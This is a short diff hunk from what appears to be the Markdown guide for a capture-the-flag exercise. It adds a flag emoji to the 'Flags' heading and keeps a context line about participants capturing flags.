@@ -750,7 +1012,7 @@ AuditLogs
 
 ---
 
-## Flags
+## 🏁 Flags
 
 Participants should capture these flags during the exercise:
 
